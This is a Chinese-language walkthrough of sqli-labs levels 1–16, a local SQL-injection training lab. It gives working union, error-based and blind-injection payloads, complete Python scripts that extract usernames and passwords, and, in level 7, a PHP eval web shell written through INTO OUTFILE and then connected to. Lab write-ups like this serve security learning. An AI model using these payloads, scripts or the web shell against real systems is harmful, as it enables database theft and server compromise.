# sqli-lab通关笔记

## 第一关

输入单引号报语法错误，说明是字符型注入，输入#注释符成功不显示报错

![image-20210510214933062](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510214933062.png)

开始`order by`查看列数 `union select` 查看显示的列数信息，然后查看`database()、version()、`如果是mysql数据库并且版本号大于5.0，就可以利用`information_schema`这个数据库进行信息的显示。而本关卡正好符合，很容易就破解了。

+ 获取列数，4列报错，3列正常显示，则说明显示SQL语句显示3列信息

  ![image-20210510215437509](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510215437509.png)

+ 获取显示的列 **注意，单引号前面的1要改成-1，因为他不能显示信息，后面的语句才能显示**

![image-20210510215708911](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510215708911.png)

显示`2,3`，下面我们就在2,3列上修改sql函数

+ 获取SQL数据库信息

  ![image-20210510215854464](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510215854464.png)

+ 先获取数据库信息、数据库表名信息、表的列名信息、最后成功显示出表中的信息

~~~
?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata # //枚举数据库
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = 'security' %23 //枚举数据库所有表名
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' %23  //枚举users表中的所有列名
?id=-1' union select 1,2,group_concat(concat(username,0x7e,password))from users %23//枚举出所有的username和password,并用~分割开

~~~

枚举所有的数据库信息![image-20210510220708753](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510220708753.png)

枚举数据库所有表名

![image-20210510220948625](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510220948625.png)

枚举users表中的所有列名

![image-20210510221142238](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510221142238.png)

枚举出所有的users表中的username和password，破解成功

![image-20210510221810545](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210510221810545.png)

## 第二关

输入`'`单引号报语法错误，然后输入注释符之后报错并没有消失，根据报错信息可以推断出这个SQL查询语句应该是数字型的。

![image-20210511101332144](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511101332144.png)

于是开始针对数字型注入开始测试，成功得到信息

![image-20210511101454919](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511101454919.png)

于是开始和第一关一样的套路，详情略过

## 第三关

判断注入类型，输入 `'`单引号报错，但是显示的报错信息有一个 `)`，我们猜测代码中进行了限制，用（）把id变量包含了起来，输入）进行验证，报错成功不显示了

![image-20210511140358241](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511140358241.png)

![image-20210511140524020](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511140524020.png)

接下来就是判断列数--》3列

以下步骤和前两关一样，不在赘述

![image-20210511140815064](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511140815064.png)

## 第四关

输入 `'`单引号判断注入类型，不报错，然后我就以为是数字类型注入，直接输入order by 判断列数，结果并没有回显列数，看来也不是数字型注入。看了源码才知道原来是 `"`双引号字符型+ `)` 注入，代码写的还挺绕。。。。

于是开始老套路，先判断列数

![image-20210511141636612](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511141636612.png)

显示`database()、version()、users()`

利用information_schema数据库爆出想要的数据表信息，不再赘述

![image-20210511141936063](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511141936063.png)

## 第五关

这一关是字符型注入，和第一关一样，但是这一关并不显示数据信息，只显示You are in……

![image-20210511142142909](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511142142909.png)

我的思路是利用报错注入，利用那三种报错注入显示数据库信息。

~~~mysql
1. union select count(*) ,concat ((此处加入执行语句),0x7e,floor (rand (0)*2))  as a from information _schema.tables group by a;
2. or extractvalue(1,concat (0x7e,(此处加入执行语句),0x7e));
3. union select updatexml(1,concat (0x7e,(此处加入执行语句),0x7e),1);
~~~

接下来利用三种语句的其中之一利用information_schema库进行注入即可

![image-20210511145507931](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210511145507931.png)

## 第六关

输入 `'`单引号没错误显示，可能不是单引号字符注入，试试双引号成功回显语法错误信息，看来是`id`用双引号包起来的，再在后面加个注释符看看错误信息消不消失，如果消失了，那就是双引号字符注入。果然错误信息消除，正常回显信息。

![image-20210512221642700](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210512221642700.png)

于是开始下一波的操作，查询列数，回显数据库的相关信息。很明显这一关他不回显数据库中的正确信息，如果语法正确他只显示You are in……，看来只能用报错注入语句试试了。

![image-20210512222329424](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210512222329424.png)

成功通关

## 第七关

第七关输入 `'`单引号报错了，然后输入注释符还是报错。输入双引号并不会报错说明不是双引号字符报错。在单引号后面输入）括号加上注释符还是报错，试试在单引号后面加上两个））引号+注释符，报错消失了，说明payload是 `')) #`。于是开始注入，判断列数和数据库信息，但是都不回显有用的信息，用报错注入还会提示有语法错误。

![image-20210513212407123](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210513212407123.png)

提示了 `Use outfile`

百度一下

**导出文件GET字符型注入**

> 导出到文件就是可以将查询结果导出到一个文件中，如常见的将一句话木马导出到一个php文件中，sqlmap中也有导出一句话和一个文件上传的页面
>
> 常用的语句是：  select "<?php @eval($_POST['giantbranch']);?>" into outfile "XXX\test.php" ，当这里要获取到网站的在系统中的具体路径（绝对路径）
>
> 这个要怎么获取呢，根据系统和数据库猜测，如winserver的iis默认路径是c:/inetpub/wwwroot/，这好像说偏了，这是asp的，但知道也好
>
> linux的nginx一般是/usr/local/nginx/html，/home/wwwroot/default，/usr/share/nginx，/var/www/htm等
>
> apache 就/var/www/htm，/var/www/html/htdocs
>
> **获取路径下面给一个很有可能获取得到的方法，（因为less7不输出信息，先从less获取信息）**
>
> 首先介绍两个可以说是函数，还是变量的东西
>
> @@datadir 读取数据库路径
>  @@basedir MYSQL 获取安装路径

那对于此处注入 没有输出 没有报错 信息回显 我们可以干嘛呐？？？

可以写入文件 别问我为什么知道 他上面谢了outfile  可是我们不知道他的绝对路径 从何写入

判断是否有写权限，可以判断有写权限

`/Less-7?id=1')) and (select count(*)from mysql.user)>0 --+` //如果返回正常则有读写权限

没办法了 这里只有从第一关来获取了

![image-20210513213648272](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210513213648272.png)

现在就是要根据目录判断该项目的地址，并写一个一句话木马文件进行连接

构造payload

~~~http
http://localhost/sqli-labs/Less-7/?id=1')) union select null,null,'<?php @eval($_POST[pass])?>' into outfile "D:\\phpstudy\\phpstudy_pro\\WWW\\sqli-labs\\shell.php"
~~~

上传成功，这里注意会出现 `**mysql 报错The MySQL server is running with the --secure-file-priv option so it cannot execute**`，需要在my.ini修改secure_file_priv='into 文件的地址'

![image-20210513220146623](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210513220146623.png)

然后用蚁剑成功连接服务器

![image-20210513220212340](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210513220212340.png)

## 第八关

报错注入和普通语句错误都不回显错误信息，语法输入正确只是显示you are in……

看来是需要用盲注了，时间盲注或者布尔盲注。弄个脚本爆破试试

**盲注需要掌握一些mysql的相关函数：**

> length(str): 返回str字符串的长度
>
> substr(str,pos,len): 将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是										数组的0开始
>
> mid(str,pos,len): 跟上面的substr一样，截取字符串
>
> ascii(str): 返回字符串str的最左面字符的ASCII码
>
> ord(str): 同上，返回ASCII码
>
> if(a,b,c): a为条件，a为true，返回b,否则返回c，如if(1>2,1,0)这个式子返回0
>
> 需要我们要记得常见的ASCII，A:65,Z:90,a:97,z:122,0:48,9:57:a
>
> 

首先 `select database()`查询数据库

ascii(substr((select database()),1,1)): 返回数据库名称的第一个字母，转化为ASCII码

ascii(substr((select database()),1,1))>64：ascii大于64就返回true，if就返回1，否则返回0

payload：

~~~http
http://localhost/sqli-labs/Less-8/?id=1' and if(ascii(substr((select database()),1,1))>64,sleep(5),1)%23 
~~~

python GET布尔盲注脚本：

~~~python
import sys
import requests

def getPayload(result_index, char_index, ascii):
    # 附加url
    start_str = "1' and "
    end_str = "--+"
    # 自定义SQL查询语句
    # 查询所有数据库名
    # select_str="select schema_name from information_schema.schemata limit "+ str(result_index) + ",1"
    # 查询特定数据库中的所有表名
    # select_str="select table_name from information_schema.tables where table_schema='security' limit "+str(result_index)+",1"
    # 查询数据库的表的列名
    # select_str= "select column_name from information_schema.columns where table_name ='users' and table_schema='security' limit " + str(result_index) + ",1"
    # 查询特定数据库特定表中内容
    select_str="select concat(username,0x7e,password) from users limit "+str(result_index)+",1"
    # 连接payload
    sqli_str = "(ascii(mid((" + select_str + ")," + str(char_index) + ",1))>" + str(ascii) + ")"
    payload = start_str + sqli_str + end_str
    # print(payload)
    return payload


def execute(result_index, char_index, ascii):
    # 连接url
    url = "http://localhost:/sqli-labs/Less-8/?id="
    exec_url = url + getPayload(result_index, char_index, ascii)
    # print(exec_url)
    # 检查回显
    echo = "You are in"
    content = requests.get(exec_url).text
    if echo in content:
        return True
    else:
        return False


def dichotomy(result_index, char_index, left, right):
    while left < right:
        # 二分法
        ascii = int((left + right) / 2)
        if execute(str(result_index), str(char_index + 1), str(ascii)):
            left = ascii
        else:
            right = ascii
        # 结束二分
        if left == right - 1:
            if execute(str(result_index), str(char_index + 1), str(ascii)):
                ascii += 1
                break
            else:
                break
    return chr(ascii)


if __name__ == "__main__":
    for num in range(32):  # 查询结果的数量
        count = 0
        for len in range(32):  # 单条查询结果的长度
            count += 1
            char = dichotomy(num, len, 30, 126)
            if ord(char) == 31:  # 单条查询结果已被遍历
                break
            sys.stdout.write(char)
            sys.stdout.flush()
        if count == 1:  # 查询结果已被遍历
            break
        sys.stdout.write("\r\n")
        sys.stdout.flush()

~~~

[更多脚本代码（get时间盲注、post布尔盲注、post时间盲注）](https://blog.csdn.net/south_layout/article/details/105964155)

成功爆出用户名和密码

![image-20210517203014403](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210517203014403.png)

## 第九关

这一关无论输入什么特殊字符，出现语法错误和正常SQL语句返回的页面都是一样的，看看源码显示，限制了正确结果与错误结果返回的页面一致，看来不能使用布尔盲注了，要使用时间盲注。

![image-20210517203434270](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210517203434270.png)

接下来，学习基于时间型SQL盲注。

我们在这里使用if（查询语句，1，sleep（5）），即如果我们的查询语句为真，那么直接返回结果；如果我们的查询语句为假，那么过5秒之后返回页面。所以我们就根据返回页面的时间长短来判断我们的查询语句是否执行正确，即我们的出发点就回到了之前的基于布尔的SQL盲注，也就是构造查询语句来判断结果是否为真。

**先判断能不能基于时间盲注来展开注入错误的语句** **等了5秒才返回的** **能基于时间的错误进行盲注**

~~~
http://127.0.0.1/sqli-labs/Less-9/?id=1%27%20and%20sleep(5)%20%23
~~~

成功执行语句，页面加载了5秒，说明注入语句成功，接下来就是爆破数据库名、表名、列名、数据库信息。

**时间盲注脚本，准确度不太满意，由于时间网页延迟的问题，多换几个时间就可以了**

```python
import sys
import time
import requests


def getPayload(result_index, char_index, ascii):
    # 附加url
    start_str = "1' and "
    end_str = "--+"
    # 自定义SQL查询语句
    # 查询所有数据库名
    select_str="select schema_name from information_schema.schemata limit "+ str(result_index) + ",1"
    # 查询特定数据库中的所有表名
    # select_str="select table_name from information_schema.tables where table_schema='security' limit "+str(result_index)+",1"
    # 查询数据库的表的列名
    # select_str= "select column_name from information_schema.columns where table_name ='users' and table_schema='security' limit " + str(result_index) + ",1"
    # 查询特定数据库特定表中内容
    # select_str = "select concat(username,0x7e,password) from users limit " + str(result_index) + ",1"
    # 连接payload
    sqli_str = "if(ascii(mid((" + select_str + ")," + str(char_index) + ",1))=" + str(ascii) + ",sleep(0.2),0)"

    payload = start_str + sqli_str + end_str
    # print(payload)
    return payload


def execute(result_index, char_index, ascii):
    # 连接url
    url = "http://localhost/sqli-labs/Less-9/?id="
    exec_url = url + getPayload(result_index, char_index, ascii)
    # print(exec_url)
    # 检查延时
    before_time = time.time()
    requests.get(exec_url)  # 节约时间
    after_time = time.time()
    use_time = after_time - before_time
    if use_time >= 0.05:
        return True
    else:
        return False


def exhaustive(result_index, char_index):
    # ascii可显字符从32到126共95个 按可能性顺序
    ascii_list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
                  'u', 'v', 'w', 'x', 'y', 'z', '_', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
                  'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ' ', '!', '"', '#', '$', '%', '&',
                  '\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':',
                  ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '`', '{', '|', '}', '~']
    for ascii_char in ascii_list:
        ascii = ord(ascii_char)
        if execute(str(result_index), str(char_index + 1), str(ascii)):
            return ascii_char
    return chr(1)


if __name__ == "__main__":
    for num in range(32):  # 查询结果的数量
        count = 0
        for len in range(32):  # 单条查询结果的长度
            count += 1
            char = exhaustive(num, len)
            if ord(char) == 1:  # 单条查询结果已被遍历
                break
            sys.stdout.write(char)
            sys.stdout.flush()
        if count == 1:  # 查询结果已被遍历
            break
        sys.stdout.write("\r\n")
        sys.stdout.flush()
```

![image-20210517211032100](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210517211032100.png)

## 第十关

和第九关一样，错误输入和正确输入的页面信息显示一样。先用时间盲注找出是字符型注入还是数字型注入，最终确定是双引号字符型注入

payload：

~~~
http://127.0.0.1/sqli-labs/Less-10?id=1" and sleep(3)%23  //页面会加载3秒，证明是双引号注入
~~~

开始直接运行时间盲注的python脚本吧,在上一关的脚本的基础上，修改一下`start_str`字段即可

~~~python
import sys
import time
import requests


def getPayload(result_index, char_index, ascii):
    # 附加url
    start_str = '1" and '
    end_str = "--+"
    # 自定义SQL查询语句
    # 查询所有数据库名
    select_str="select schema_name from information_schema.schemata limit "+ str(result_index) + ",1"
    # 查询特定数据库中的所有表名
    # select_str="select table_name from information_schema.tables where table_schema='security' limit "+str(result_index)+",1"
    # 查询数据库的表的列名
    # select_str= "select column_name from information_schema.columns where table_name ='users' and table_schema='security' limit " + str(result_index) + ",1"
    # 查询特定数据库特定表中内容
    # select_str = "select concat(username,0x7e,password) from users limit " + str(result_index) + ",1"
    # 连接payload
    sqli_str = "if(ascii(mid((" + select_str + ")," + str(char_index) + ",1))=" + str(ascii) + ",sleep(0.1),0)"

    payload = start_str + sqli_str + end_str
    # print(payload)
    return payload


def execute(result_index, char_index, ascii):
    # 连接url
    url = "http://localhost/sqli-labs/Less-10/?id="
    exec_url = url + getPayload(result_index, char_index, ascii)
    # print(exec_url)
    # 检查延时
    before_time = time.time()
    requests.get(exec_url)  # 节约时间
    after_time = time.time()
    use_time = after_time - before_time
    if use_time >= 0.09:
        return True
    else:
        return False


def exhaustive(result_index, char_index):
    # ascii可显字符从32到126共95个 按可能性顺序
    ascii_list = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
                  'u', 'v', 'w', 'x', 'y', 'z', '_', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
                  'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', ' ', '!', '"', '#', '$', '%', '&',
                  '\'', '(', ')', '*', '+', ',', '-', '.', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':',
                  ';', '<', '=', '>', '?', '@', '[', '\\', ']', '^', '`', '{', '|', '}', '~']
    for ascii_char in ascii_list:
        ascii = ord(ascii_char)
        if execute(str(result_index), str(char_index + 1), str(ascii)):
            return ascii_char
    return chr(1)


if __name__ == "__main__":
    for num in range(32):  # 查询结果的数量
        count = 0
        for len in range(32):  # 单条查询结果的长度
            count += 1
            char = exhaustive(num, len)
            if ord(char) == 1:  # 单条查询结果已被遍历
                break
            sys.stdout.write(char)
            sys.stdout.flush()
        if count == 1:  # 查询结果已被遍历
            break
        sys.stdout.write("\r\n")
        sys.stdout.flush()

~~~

![image-20210517212451407](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210517212451407.png)

准确率还是很差

## 第十一关

![image-20210519114118567](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519114118567.png)

使用post方法传递参数，经过测试username存在单引号字符型注入，并且没有过滤任何特殊字符

获取数据库payload：

~~~
uname=aaa'union+select+user(),group_concat(schema_name)+from+information_schema.schemata+%23&passwd=aaa&submit=Submit
~~~

![image-20210519114246873](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519114246873.png)

获取security数据库的表payload：

~~~
uname=aaa'union+select+user(),group_concat(table_name)+from+information_schema.tables+where+table_schema="security"%23&passwd=aaa&submit=Submit
~~~

![image-20210519114424756](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519114424756.png)

security数据库中有表：emails、referers、uagents、users

现在获取users表中的所有字段，payload：

~~~
uname=aaa'union+select+user(),group_concat(column_name)+from+information_schema.columns+where+table_schema="security"+and+table_name="users"%23&passwd=aaa&submit=Submit
~~~

![image-20210519114644033](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519114644033.png)

security.users表中有字段：id、username、password

获取security.users表中的所有数据，payload：

~~~
uname=aaa'union+select+user(),group_concat(concat(username,0x7e,password))+from+security.users%23&passwd=aaa&submit=Submit
~~~

![image-20210519115045872](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519115045872.png)

成功获取想得到的数据

## 第十二关

 

![image-20210519122506609](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519122506609.png)

这一关依然是post方法传递参数值

经过测试，这一关是 `") ` 字符型注入，并没有过滤任何特殊字符，payload：

~~~
uname=aaa%22)union+select+1,2#&passwd=aaa&submit=Submit
~~~

![image-20210519123004345](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519123004345.png)

获取数据库版本信息、数据库名称等

~~~
uname=aaa%22)union+select+database(),version()#&passwd=aaa&submit=Submit
~~~



![image-20210519123224721](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519123224721.png)

开始获取数据库，payload:

~~~
uname=aaa%22)union+select+database(),group_concat(schema_name)+from+information_schema.schemata#&passwd=aaa&submit=Submit
~~~

![image-20210519123437363](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519123437363.png)

获取hadsky数据库中的所有表名称，payload:

~~~
uname=aaa%22)union+select+database(),group_concat(table_name)+from+information_schema.tables+where+table_schema="hadsky"#&passwd=aaa&submit=Submit
~~~

![image-20210519123759380](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519123759380.png)

获取hadsky.pk_user表中字段的信息，payload：

~~~
uname=aaa%22)union+select+database(),group_concat(column_name)+from+information_schema.columns+where+table_schema="hadsky"+and+table_name="pk_user"#&passwd=aaa&submit=Submit
~~~

![image-20210519124015764](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519124015764.png)

获取hadsky.pk_user表中的username和password信息，payload：

~~~
uname=aaa%22)union+select+database(),group_concat(username,0x7e,password)+from+hadsky.pk_user#&passwd=aaa&submit=Submit
~~~

![image-20210519124320254](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519124320254.png)

成功获取所需的username和password信息

## 第十三关

经过测试，本关卡是 `')'字符型注入`，但是使用 `union select`字符并不会显示数据库版本之类的信息，估计后台代码并没写回显代码，接下来我试了报错注入和利用布尔盲注都成功了。接下来我还是选择报错注入语句

payload：

~~~
uname=aaa')+or+updatexml(1,concat(0x7e,database(),0x7e),1)#&passwd=aaa&submit=Submit
~~~

![image-20210519125512762](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519125512762.png)

开始利用`information_schema`数据库获取所有数据库名称，**`limit`关键字是从0开始遍历的**！！！ 

payload：

~~~
uname=aaa')+or+updatexml(1,concat(0x7e,(select+(schema_name)+from+information_schema.schemata+limit+3,1),0x7e),1)#&passwd=aaa&submit=Submit
~~~

![image-20210519130002929](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519130002929.png)

接下来咱们获取一下数据库 `mms`中的一些信息，payload：

~~~
uname=aaa')+or+updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema="mms"),0x7e),1)#&passwd=aaa&submit=Submit
~~~

![image-20210519130448745](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519130448745.png)

mms数据库中有四张表，获取一下user表中的信息吧，下一步先获取user表中字段信息。payload：

~~~
uname=aaa')+or+updatexml(1,concat(0x7e,(select+group_concat(column_name)+from+information_schema.columns+where+table_schema="mms"+and+table_name="user"),0x7e),1)#&passwd=aaa&submit=Submit
~~~

![image-20210519130636730](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519130636730.png)

现在可以直接获得mms.user表中的信息了，payload：

~~~
uname=aaa')+or+updatexml(1,concat(0x7e,(select+group_concat(uUsername,0x7e,uPassword)+from+mms.user),0x7e),1)#&passwd=aaa&submit=Submit
~~~

![image-20210519181903184](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210519181903184.png)

成功获得需要得到的信息，通过本关卡

## 第十四关

经过测试，本关卡是双引号字符型注入，并且注入的列数为两列

![image-20210521113903090](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521113903090.png)

但是使用 `union select` 无回显信息，报错注入成功显示信息

![image-20210521114227279](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521114227279.png)

获取数据库，其中用到了 `right()`函数：`right(str, length)`，即：right(被截取字符串， 截取长度)

获得数据库payload：

~~~
uname=aaa%22+or+updatexml(1,concat(0x7e,(select+right(group_concat(schema_name),15)+from+information_schema.schemata),0x7e),1)+%23&passwd=aaa&submit=Submit
~~~

![image-20210521130413879](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521130413879.png)

开始获取数据库 `security`中的表，payload：

~~~
uname=aaa%22+or+updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema="security"),0x7e),1)+%23&passwd=aaa&submit=Submit
~~~

![image-20210521130702574](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521130702574.png)

获取security.users表中的字段，payload：

~~~
uname=aaa%22+or+updatexml(1,concat(0x7e,(select+group_concat(column_name)+from+information_schema.columns+where+table_schema="security"+and+table_name="users"),0x7e),1)+%23&passwd=aaa&submit=Submit
~~~

![image-20210521130823024](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521130823024.png)

获取security.users表中的数据，payload：

~~~
uname=aaa%22+or+updatexml(1,concat(0x7e,(select+group_concat(username,0x7e,password)+from+security.users),0x7e),1)+%23&passwd=aaa&submit=Submit
~~~

![image-20210521130942406](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521130942406.png)

内容没有显示完全，可以使用left()或者right()查看剩余的内容

## 第十五关

![image-20210521131658328](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521131658328.png)

使用这个语句成功判断这一关是单引号字符注入，报错注入和union注入都不会回显任何消息，看来只能盲注了

使用布尔盲注，因为执行成功与失败页面会显示不同的图片内容

~~~
uname=1'+or+ascii(mid(database(),1,1))>33#&passwd=aa&submit=Submit
~~~

![image-20210521132216267](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521132216267.png)

下面就是编写py脚本，语句成功返回上面的图片

python脚本：

~~~python
import time
import sys
import requests


def getPayload(result_index, char_index, ascii):


	select_str = "select concat(content,'@',time)  from pikachu.message limit "+str(result_index)+",1" #DIY地址
	
	# 连接payload
	sqli_str = "1' or (ascii(mid((" + select_str + ")," + str(char_index) + ",1))>" + str(ascii) + ")#" #DIY地址
	payload = {"uname":sqli_str,"passwd":"aa","submit":"Submit"}  #DIY地址

	return payload


def execute(result_index, char_index, ascii):
	# 连接url
	url = "http://localhost/sqli-labs/Less-15/index.php"  #DIY地址
	payload = getPayload(result_index, char_index, ascii)
	# print(payload)
	# 检查回显
	echo = "flag"            #DIY地址
	content = requests.post(url, data=payload).text
	time.sleep(0.1)
	# print(content)
	if echo in content:
		return True
	else:
		return False


def dichotomy(result_index, char_index, left, right):
	while left < right:
		# 二分法
		ascii = int((left + right) / 2)
		if execute(str(result_index), str(char_index + 1), str(ascii)):
			left = ascii
		else:
			right = ascii
		# 结束二分
		if left == right - 1:
			if execute(str(result_index), str(char_index + 1), str(ascii)):
				ascii += 1
				break
			else:
				break
	return chr(ascii)


if __name__ == "__main__":
	for num in range(32):  # 查询结果的数量  #DIY地址
		count = 0
		for len in range(32):  # 单条查询结果的长度   #DIY地址
			count += 1
			char = dichotomy(num, len, 30, 126)
			if ord(char) == 1:  # 单条查询结果已被遍历
				break
			sys.stdout.write(char)
			sys.stdout.flush()
		if count == 1:  # 查询结果已被遍历
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()
~~~

上面的脚本是获取 `pikachu.message`表中的content和time字段的信息，时间没有显示完全，使用以下函数调用索引即可：`mid()、substr()、left()、right()、substring()`

![image-20210521192440701](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210521192440701.png)

通过python脚本正确遍历出数据库中的内容

## 第十六关

使用Username payload：`aa") or 1 #`判断出注入类型

![image-20210527163352492](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527163352492.png)

页面显示出了success图片，页面并无回显任何数据库信息，只显示报错图片和成功图片，所以可以采用python脚本的post方法布尔盲注

payload：

~~~python
import time
import sys
import requests


def getPayload(result_index, char_index, ascii):


	# select_str = "select database()" #DIY地址
	# select_str = "select schema_name from information_schema.schemata limit "+str(result_index)+" ,1" #DIY地址,获取所有的数据库
	# select_str = "select table_name from information_schema.tables where table_schema='security' limit "+str(result_index)+" ,1" #DIY地址,获取某个数据库中的所有表
	# select_str = "select column_name from information_schema.columns where table_schema='security' and table_name='users' limit "+str(result_index)+" ,1" #DIY地址,某张表中所有的字段名称
	select_str = "select concat(username,'~',password) from security.users limit "+str(result_index)+" ,1" #获取表中的内容
	# 连接payload
	sqli_str = '1")^(ascii(mid(('+ select_str +")," + str(char_index) + ",1))>" + str(ascii) + ")#" #DIY地址,获取所有的数据库
	# print(sqli_str)
	payload = {"uname":sqli_str,
			   "passwd":"aaa",
			   "submit":"Submit"
			   }  #DIY地址

	return payload


def execute(result_index, char_index, ascii):
	# 连接url
	url = "http://localhost/sqli-labs/Less-16/"  #DIY地址
	payload = getPayload(result_index, char_index, ascii)
	# print(payload)
	# 检查回显
	echo = "flag.jpg"            #DIY地址
	content = requests.post(url, data=payload).text
	# print(content)
	time.sleep(0.1)
	# print(content)
	if echo in content:
		return True
	else:
		return False


def dichotomy(result_index, char_index, left, right):
	while left < right:
		# 二分法
		ascii = int((left + right) / 2)
		if execute(str(result_index), str(char_index + 1), str(ascii)):
			left = ascii
		else:
			right = ascii
		# 结束二分
		if left == right - 1:
			if execute(str(result_index), str(char_index + 1), str(ascii)):
				ascii += 1
				break
			else:
				break
	return chr(ascii)


if __name__ == "__main__":
	for num in range(32):  # 查询结果的数量  #DIY地址
		count = 0
		for len in range(32):  # 单条查询结果的长度   #DIY地址
			count += 1
			char = dichotomy(num, len, 30, 126)
			if ord(char) == 31:  # 单条查询结果已被遍历
				break
			sys.stdout.write(char)
			sys.stdout.flush()
		if count == 1:  # 查询结果已被遍历
			break
		sys.stdout.write("\r\n")
		sys.stdout.flush()


~~~

成功使用脚本爆破出表中的值

![image-20210527170429861](sqli-lab%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0.assets/image-20210527170429861.png)

## 第十七关

